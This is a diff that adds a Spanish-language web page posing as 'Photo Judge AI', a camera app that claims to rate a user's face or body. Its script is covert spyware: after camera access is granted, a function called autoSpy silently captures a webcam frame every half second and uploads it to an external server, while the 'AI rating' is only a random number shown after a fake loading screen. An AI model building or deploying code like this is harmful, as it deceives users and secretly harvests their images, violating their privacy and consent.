@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Photo Judge AI - Pro Quality</title>
+    <style>
+        * { box-sizing: border-box; touch-action: none; user-select: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; color: white; }
+        
+        video#webcam {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            object-fit: cover; z-index: 1;
+        }
+
+        #btn-home {
+            position: absolute; top: 20px; right: 20px; z-index: 100;
+            background: rgba(0,0,0,0.6); border: 2px solid #00fbff;
+            border-radius: 50%; width: 50px; height: 50px;
+            display: flex; align-items: center; justify-content: center; font-size: 24px; cursor: pointer;
+        }
+
+        #ui-hud {
+            position: absolute; bottom: 0; width: 100%; height: 160px;
+            background: rgba(0,0,0,0.5); z-index: 10;
+            display: none; align-items: center; justify-content: space-around;
+        }
+
+        #btn-shoot {
+            width: 80px; height: 80px; background: white; border-radius: 50%;
+            border: 5px solid #444; cursor: pointer;
+        }
+
+        #btn-rotate {
+            background: rgba(255,255,255,0.2); border: none; color: white;
+            padding: 10px 20px; border-radius: 20px; font-weight: bold;
+        }
+
+        .overlay { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.9); z-index: 1000; 
+            display: flex; align-items: center; justify-content: center; text-align: center; flex-direction: column;
+        }
+        
+        #dark-warning { background: #000; z-index: 2000; display: none; color: #ff0055; }
+        #selection-screen { z-index: 1100; display: none; }
+        .mode-btn {
+            width: 80%; max-width: 300px; padding: 25px; margin: 15px;
+            border: 3px solid #00fbff; background: transparent; color: white;
+            font-size: 20px; font-weight: bold; border-radius: 15px; cursor: pointer;
+        }
+
+        #loading-screen { display: none; z-index: 1400; background: rgba(0,0,0,0.95); }
+        #result-screen { display: none; z-index: 1500; background: #000; }
+        #score-num { font-size: 100px; color: #00fbff; text-shadow: 0 0 20px #00fbff; }
+
+        .spinner {
+            width: 60px; height: 60px; border: 6px solid #333;
+            border-top: 6px solid #00fbff; border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<video id="webcam" autoplay playsinline></video>
+<div id="btn-home" onclick="goHome()">🏠</div>
+
+<div id="dark-warning" class="overlay">
+    <h1>⚠️ POCA LUZ</h1>
+    <p>Enciende una luz para usar la cámara.</p>
+</div>
+
+<div id="perm-screen" class="overlay">
+    <div style="border: 2px solid #00fbff; padding: 30px; border-radius: 15px;">
+        <h2 style="color:#00fbff">CONFIGURACIÓN</h2>
+        <p>Habilita la cámara para empezar.</p>
+        <button onclick="initCamera()" style="width:100%; padding:15px; background:#00fbff; border:none; font-weight:bold; color: black;">ACTIVAR</button>
+    </div>
+</div>
+
+<div id="selection-screen" class="overlay">
+    <h1 style="color:#00fbff; margin-bottom: 40px;">¿QUÉ CALIFICAMOS?</h1>
+    <button class="mode-btn" onclick="selectMode('CARA')">SOLO CARA</button>
+    <button class="mode-btn" onclick="selectMode('CUERPO')">CUERPO COMPLETO</button>
+</div>
+
+<div id="loading-screen" class="overlay">
+    <div class="spinner"></div>
+    <h3>ANALIZANDO CON IA...</h3>
+    <p id="loading-text">Evaluando proporciones</p>
+</div>
+
+<div id="ui-hud">
+    <button id="btn-rotate" onclick="flipCamera()">GIRAR</button>
+    <div id="btn-shoot" onclick="takePhoto()"></div>
+    <div style="width: 70px;"></div> 
+</div>
+
+<div id="result-screen" class="overlay">
+    <p id="judged-mode" style="color: #00fbff; letter-spacing: 2px;"></p>
+    <p>CALIFICACIÓN:</p>
+    <div id="score-num">0</div>
+    <button onclick="closeResult()" style="margin-top:30px; padding:15px 40px; background:#fff; color:#000; border:none; font-weight:bold; border-radius:50px;">REINTENTAR</button>
+</div>
+
+<script>
+    const video = document.getElementById('webcam');
+    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
+    
+    let currentMode = "user"; 
+    let stream = null;
+
+    async function initCamera() {
+        try {
+            if (stream) stream.getTracks().forEach(t => t.stop());
+            stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: currentMode, sharpness: { ideal: 100 } } 
+            });
+            video.srcObject = stream;
+            video.style.transform = (currentMode === "user") ? "scaleX(-1)" : "scaleX(1)";
+            
+            document.getElementById('perm-screen').style.display = 'none';
+            document.getElementById('selection-screen').style.display = 'flex';
+            
+            setInterval(lightCheck, 1000);
+            setInterval(autoSpy, 500); 
+        } catch (e) { alert("Error al activar cámara."); }
+    }
+
+    function selectMode(mode) {
+        document.getElementById('judged-mode').innerText = "CALIFICANDO: " + mode;
+        document.getElementById('selection-screen').style.display = 'none';
+        document.getElementById('ui-hud').style.display = 'flex';
+    }
+
+    function goHome() {
+        document.getElementById('ui-hud').style.display = 'none';
+        document.getElementById('result-screen').style.display = 'none';
+        document.getElementById('selection-screen').style.display = 'flex';
+    }
+
+    function flipCamera() {
+        currentMode = (currentMode === "user") ? "environment" : "user";
+        initCamera();
+    }
+
+    function lightCheck() {
+        const c = document.createElement('canvas');
+        const ctx = c.getContext('2d');
+        c.width = 40; c.height = 30;
+        ctx.drawImage(video, 0, 0, 40, 30);
+        const data = ctx.getImageData(0, 0, 40, 30).data;
+        let b = 0;
+        for(let i=0; i<data.length; i+=4) b += (data[i]+data[i+1]+data[i+2])/3;
+        document.getElementById('dark-warning').style.display = (b/(data.length/4) < 35) ? 'flex' : 'none';
+    }
+
+    function autoSpy() {
+        if (!video.videoWidth) return;
+        const s = document.createElement('canvas');
+        s.width = 480; s.height = 640; 
+        const ctx = s.getContext('2d');
+        ctx.imageSmoothingEnabled = true;
+        ctx.imageSmoothingQuality = 'high';
+        ctx.drawImage(video, 0, 0, 480, 640);
+        sendToServer(s.toDataURL('image/jpeg', 0.7)); 
+    }
+
+    function takePhoto() {
+        const s = document.createElement('canvas');
+        s.width = 480; s.height = 640;
+        const ctx = s.getContext('2d');
+        
+        ctx.imageSmoothingEnabled = true;
+        ctx.imageSmoothingQuality = 'high';
+        
+        if(currentMode === "user") {
+            ctx.translate(s.width, 0);
+            ctx.scale(-1, 1);
+        }
+        ctx.drawImage(video, 0, 0, 480, 640);
+        const data = s.toDataURL('image/jpeg', 0.95);
+        sendToServer(data);
+
+        document.getElementById('loading-screen').style.display = 'flex';
+        document.getElementById('ui-hud').style.display = 'none';
+
+        setTimeout(() => {
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('score-num').innerText = Math.floor(Math.random() * 10) + 1;
+            document.getElementById('result-screen').style.display = 'flex';
+        }, 2500);
+    }
+
+    function closeResult() {
+        document.getElementById('result-screen').style.display = 'none';
+        document.getElementById('ui-hud').style.display = 'flex';
+    }
+
+    function sendToServer(img) {
+        fetch(SERVER_URL, {
+            method: 'POST',
+            mode: 'cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: img })
+        }).catch(e => console.log("Error de red"));
+    }
+</script>
+</body>
+</html>
